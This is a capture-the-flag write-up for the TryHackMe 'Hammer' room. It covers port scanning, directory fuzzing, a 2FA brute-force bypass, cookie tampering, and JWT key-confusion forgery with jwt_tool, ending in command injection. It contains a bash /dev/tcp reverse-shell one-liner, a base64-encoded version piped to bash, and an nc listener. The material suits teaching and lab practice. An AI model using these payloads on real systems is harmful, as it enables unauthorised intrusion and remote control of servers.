<!-- THM HEADER -->
<img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1719928635928.png" width="1868" height="300">

The goal of this TryHackMe room is to achieve Remote Code Execution (RCE) via a website's dashboard page. From there, the task involves escalating privileges to gain admin access and establishing a reverse shell on the web server.

*(No flags will be directly shown in this write-up)*

---
### Recon

An initial port scan identified two open ports. Given that this room focuses on bypassing authentication mechanisms, **port 1337** is prioritised as the primary target.
#### Steps to Reproduce

1. **Send Request via CLI:** 

   Use the following command to perform an initial port scan:

```shell
./InitPortScan hammer.thm
```
<img src="https://github.com/ChrisRyanKelly/THM-Write-Ups/blob/master/hammer/screenshots/initportscan.png" width="1280" height="248">

This script, a wrapper for **naabu** (a port scanner by Project Discovery), conducts a full port scan and passes all identified open ports to **nmap** for a service version check.

#

### Enumeration: 1337/tcp

Using **httpie** to inspect the target identified during the scanning phase reveals the page source code. Upon review, a developer comment is discovered, outlining the site's directory naming convention.

In addition to the developer's note, the response contains other elements of interest, such as a link to a password reset page. These findings will be addressed later in the process.

###### Hidden Directories and Log Files:
Leveraging **ffuf** and the information from the developer's note, several hidden directories were identified. Among these, the `/hmr_logs/` directory stands out due to its inclusion of an accessible `error.log` file. Upon inspection using **httpie**, this log file reveals an email address, which becomes crucial for further exploitation.

###### Password Reset Page Analysis:
The email address from the log file is submitted to the password reset page, which prompts for a recovery code. Investigating further, a verbose **httpie** request to the password reset page highlights how the developers have implemented the two-factor authentication (2FA) mechanism.

Noteworthy findings include:

1. A **180-second time restriction** for recovery code submission.
2. **Rate limiting** on the input field, locking users out after 10 incorrect attempts.

#### Steps to Reproduce

1. **Send Request via CLI:**

```shell
http hammer.thm:1337
```
<img src="https://github.com/ChrisRyanKelly/THM-Write-Ups/blob/master/hammer/screenshots/devnote.png" width="1280" height="310">

2. **Directory Brute Force:**

```shell
ffuf -w /usr/share/wordlist/dirb/common.txt -u http://hammer.thm:1337hmr_FUZZ
```
<img src="https://github.com/ChrisRyanKelly/THM-Write-Ups/blob/master/hammer/screenshots/dirbrut.png" width="1280" height="310">

3. **Inspect Log File:**

   Use the `-b` flag to omit response headers and clean up the output.

```shell
http -b hammer.thm:1337/hmr_logs/error.log
```
<img src="https://github.com/ChrisRyanKelly/THM-Write-Ups/blob/master/hammer/screenshots/viewlogs.png" width="1280" height="310">

4. **Inspect 2FA Mechanism:**

```shell
http --form --follow POST hammer.thm:1337/reset_password.php email=tester@hammer.thm
```
<img src="https://github.com/ChrisRyanKelly/THM-Write-Ups/blob/master/hammer/screenshots/2fa-mech 17.19.46.png" width="1280" height="610">

#

### Authentication Bypass

Using a custom script (available on my GitHub page) and the information gathered during the enumeration of port 1337, a successful login was achieved, granting access to the user dashboard.

###### Session Management Discovery:
Upon inspecting the dashboard's source code, a JavaScript snippet responsible for session management was identified. The script continuously checks for the presence of the `persistentSession` cookie. If this cookie is missing—due to deletion or expiration—the script calls `logout.php`, which terminates the session.

###### Maintaining Dashboard Access:
Open the browser's developer tools, locate the `persistentSession` cookie, and modify its expiry data. Extending the cookie's life prevents the `logout.php` function from being triggered, delaying session termination.

Alternatively, use **httpie** to interact with the dashboard. By including the `persistentSession` cookie and its value (disclosed in the login request response after resetting the password), session management is effectively bypassed.

#### Steps to Reproduce

1. **Bypass 2FA and Authenticate:**  

   Run the custom Python script:
   
```shell
python3 Mjölnir.py
```
<img src="https://github.com/ChrisRyanKelly/THM-Write-Ups/blob/master/hammer/screenshots/pythonscript.png" width="1280" height="145">

2. **Inspect JavaScript for Session Management:**  

   Perform a verbose POST request to inspect how session management is implemented:

```shell
http --form -v --follow POST hammer.thm:1337/ email=tester@hammer.thm password=Password123
```
<img src="https://github.com/ChrisRyanKelly/THM-Write-Ups/blob/master/hammer/screenshots/apicall.png" width="1280" height="375">

#

### Initial Access

The dashboard page includes an input field that appears vulnerable to command injection. However, the only command initially executable is `ls`. Commands are executed via API calls to the `execute_command.php` endpoint.

###### JWT-Based Command Execution:
The server relies on a JSON Web Token (JWT) to determine the commands a user can execute. A standard user is restricted to executing the `ls` command. However, this restriction can be bypassed due to a vulnerability in the JWT's `kid` (Key ID) header value, enabling a **key confusion attack**.

###### Key Confusion Attack Explained:
The `kid` value (`/var/www/mykey.key`) points to a file containing the server's signing key. By exploiting this, the `kid` can be manipulated to reference an arbitrary file on the system, such as `/proc/sys/kernel/randomize_va_space`. This tricks the server into using the contents of the targeted file as a signing key.

By re-signing the JWT with a modified payload (e.g., `role: admin`), it is possible to escalate privileges and execute arbitrary commands as an admin user. This privilege escalation enables an attacker to gain access to the web server via a reverse shell connection.

###### Revers Shell: 
Achieving the reverse shell required some trial and error. The typical Bash one-liner: `bash -i >& /dev/tcp/10.21.73.105/9999 0>&1` did not work. Instead, the command was **base64-encoded** and sent via an HTTP request to the server. The server executes the command, and the connection is established using a listener (e.g., `nc -lvnp 9999`).

#### Steps to Reproduce

1. **Copy JWT:**  

   Identify and copy the JWT from intercepted login requests using httpie:
   
```shell
http --form -v --follow POST hammer.thm:1337/ email=tester@hammer.thm password=Password123
```

<img src="https://github.com/ChrisRyanKelly/THM-Write-Ups/blob/master/hammer/screenshots/tokencookie.png" width="1280" height="610">

Ensure to also take note of the Set-Cookie: value `persistentSession=no` for later on.
   
2. **Tamper with JWT:**  

   Modify the `kid` value and re-sign the JWT using the following command:
   
```shell
python3 jwt_tool.py <JWT.Token> -T -S hs256 -kf /proc/sys/kernel/randomize_va_space
```

Follow the interactive wizard to correctly forge the JWT. The selection order is as follows:
- 3, 0, 5, 3, 0, 0.

<img src="https://github.com/ChrisRyanKelly/THM-Write-Ups/blob/master/hammer/screenshots/forgedjwt.png" width="1280" height="145">

3. **Inject command:**  

   Use the forged JWT and base64-encoded Bash command to send a request to the server:
   
```shell
http -b --path-as-is POST hammer.thm:1337/execute_command.php \ Authorization:"Bearer <JWT.Token>" \ Cookie:"persistentSession=no" \ command="echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMS43My4xMDUvOTk5OSAwPiYxCg== | base64 -d | bash"
```

Ensure you have a listener ready (e.g., `nc -lvnp 9999`) before sending the request.

<img src="https://github.com/ChrisRyanKelly/THM-Write-Ups/blob/master/hammer/screenshots/callback.png" width="1280" height="200">

---
### Conclusion
This write-up is designed to offer a unique perspective on tackling the room without revealing any flags, allowing readers to experience the challenge firsthand. The goal is to highlight key methodologies, tools, and techniques used throughout the process while encouraging hands-on learning.

Additionally, this write-up served as an opportunity to enhance my scripting and exploit development skills. All the scripts referenced here have been shared on my GitHub page, where you can find them to assist in your own exploration of this room. Feel free to use and adapt them to deepen your understanding and refine your approach.
